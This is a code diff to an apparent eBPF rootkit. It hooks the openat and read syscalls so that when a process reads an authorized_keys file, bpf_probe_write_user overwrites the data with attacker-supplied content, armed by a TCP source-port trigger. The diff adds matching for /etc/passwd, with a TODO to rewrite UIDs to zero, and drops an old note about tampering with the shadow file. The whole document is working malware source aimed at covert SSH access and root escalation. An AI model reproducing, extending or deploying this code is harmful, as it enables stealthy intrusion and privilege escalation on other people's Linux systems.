@@ -12,6 +12,9 @@
                          ##__VA_ARGS__);                \
 })
 
+#define AUTHORIZED_KEYS 1
+#define PASSWD 2
+
 #define filename_len_max 128
 #define overwritten_content_len_max 65536
 
@@ -21,9 +24,6 @@
 */
 
 const volatile unsigned short src_port = 2345;
-
-const volatile int filename_len = 0;
-const volatile char filename[filename_len_max];
 
 const volatile int overwritten_content_len = 0;
 const volatile char overwritten_content[overwritten_content_len_max];
@@ -39,6 +39,7 @@ struct elem {
     int fd;
     unsigned long buff;
     int buff_len;
+    int file_type;
 };
 
 struct {
@@ -48,6 +49,11 @@ struct {
     __type(value, struct elem); // elem
 } pid_elem SEC(".maps");
 
+/*
+    passwd data
+*/
+
+// TODO
 
 /*
     Port Trigger
@@ -69,6 +75,7 @@ struct {
 SEC("tp/syscalls/sys_enter_openat")
 int openat_entrypoint(struct trace_event_raw_sys_enter *ctx)
 {
+    int file_type = 0;
     int tgid = bpf_get_current_pid_tgid();
     int pid = bpf_get_current_pid_tgid() >> 32;
     char comm[10];
@@ -87,11 +94,53 @@ int openat_entrypoint(struct trace_event_raw_sys_enter *ctx)
     char check_filename[filename_len_max];
     bpf_probe_read(&check_filename, filename_len_max, (char*)ctx->args[1]);
 
-    /* Auth_keys file */    
-    for (int i = 0; i < filename_len; i++) {
-        if (check_filename[i] != filename[i]) {
-            return 0;
+
+
+    int is_passwd = 1;
+    /* passwd */
+    const char passwd[] = "/etc/passwd";
+    for (int i = 0; i < 11; i++) {
+        if (passwd[i] != check_filename[i]) {
+            is_passwd = 0;
+            break;
         }
+    }
+    if (is_passwd == 1) {
+        file_type = PASSWD;
+    }
+
+    int is_auth_key = 0;
+    if (file_type == 0) {
+        /* Auth_keys file */
+        int checking_auth_file = 0;   
+        for (int i = 0; i < filename_len_max; i++) {
+            if (checking_auth_file == 1) {
+                if (i+14 > filename_len_max) {
+                    break;
+                }
+                if (check_filename[i] == 'a' && check_filename[i+1] == 'u' && check_filename[i+2] == 't' && check_filename[i+3] == 'h' && check_filename[i+4] == 'o' && check_filename[i+5] == 'r' && check_filename[i+6] == 'i' && check_filename[i+7] == 'z' && check_filename[i+8] == 'e' && check_filename[i+9] == 'd' && check_filename[i+10] == '_' && check_filename[i+11] == 'k' && check_filename[i+12] == 'e' && check_filename[i+13] == 'y' && check_filename[i+14] == 's') {
+                    is_auth_key = 1;
+                    break;
+                } else {
+                    checking_auth_file = 0;
+                }
+            }
+            if (check_filename[i] == '/') {
+                checking_auth_file = 1;
+            }
+            // if null byte
+            if (check_filename[i] == 0) {
+                break;
+            }
+        }
+    }
+    
+    if (is_auth_key == 1) {
+        file_type = AUTHORIZED_KEYS;
+    }
+
+    if (file_type == 0) { // not passwd or auth_keys
+        return 0;
     }
 
     bpf_printk("openat_entrypoint[%d] path: %s\n", pid, ctx->args[1]);
@@ -99,7 +148,8 @@ int openat_entrypoint(struct trace_event_raw_sys_enter *ctx)
         .pid = pid,
         .fd = ctx->args[0],
         .buff = 0,
-        .buff_len = 0
+        .buff_len = 0,
+        .file_type = file_type
     };
     bpf_map_update_elem(&pid_elem, &tgid, &value, 0);
     return 0;
@@ -108,6 +158,7 @@ int openat_entrypoint(struct trace_event_raw_sys_enter *ctx)
 SEC("tp/syscalls/sys_exit_openat")
 int openat_exitpoint(struct trace_event_raw_sys_exit *ctx)
 {
+    const int trigger_key = 0;
     int tgid = bpf_get_current_pid_tgid();
     struct elem *fd = bpf_map_lookup_elem(&pid_elem, &tgid);
     if (fd == 0) {
@@ -118,6 +169,7 @@ int openat_exitpoint(struct trace_event_raw_sys_exit *ctx)
 
     if (ctx->ret < 0) {
         bpf_map_delete_elem(&pid_elem, &tgid);
+        bpf_map_delete_elem(&next_uid, &trigger_key);
         return 0;
     }
 
@@ -165,15 +217,22 @@ int read_exitpoint(struct trace_event_raw_sys_exit *ctx)
         return 0;
     }
     int ttl = args->ttl;
+    int file_type = e->file_type;
 
-    if (overwritten_content_len+1 > ctx->ret) {
+
+    if (file_type == AUTHORIZED_KEYS && overwritten_content_len+1 > ctx->ret) {
         bpf_printk("Error read_exitpoint[%d]: buff_len: %d < %d\n", tgid, ctx->ret, overwritten_content_len+1);
         bpf_map_delete_elem(&pid_elem, &tgid);
         bpf_map_delete_elem(&next_uid, &trigger_key);
         return 0;
     }
 
-    bpf_probe_write_user((void*)e->buff, (void*)overwritten_content, overwritten_content_len+1); // +1 for null byte
+    if (file_type == AUTHORIZED_KEYS) {
+        bpf_probe_write_user((void*)e->buff, (void*)overwritten_content, overwritten_content_len+1); // +1 for null byte
+    } else if (file_type == PASSWD) {
+        // TODO: need to loop through each char and replace any 1-9 with 0
+        
+    }
     
     bpf_printk("read_exitpoint[%d]: fd = %d, buff_len = %d\n", tgid, e->fd, e->buff_len);
     bpf_map_delete_elem(&pid_elem, &tgid);
@@ -184,11 +243,6 @@ int read_exitpoint(struct trace_event_raw_sys_exit *ctx)
     }
     return 0;
 }
-
-/*
-- [x] Write into authorized_keys if it exists
-- [ ] Write into shadow if fetched
-*/
 
 /*
     Trigger UID from tcp src port
@@ -203,10 +257,9 @@ int accept_entrypoint(struct trace_event_raw_sys_enter *ctx)
         return 0;
     }
     struct sockaddr_in * addr = (struct sockaddr_in *)ctx->args[1];
-    int ttl = 2;
     struct accept_args args = {
         .addr = addr,
-        ttl = 2 // doing a little hack
+        .ttl = 4 // doing a little hack
     };
     const int key = 0;
     bpf_map_update_elem(&next_uid, &key, &args, 0);
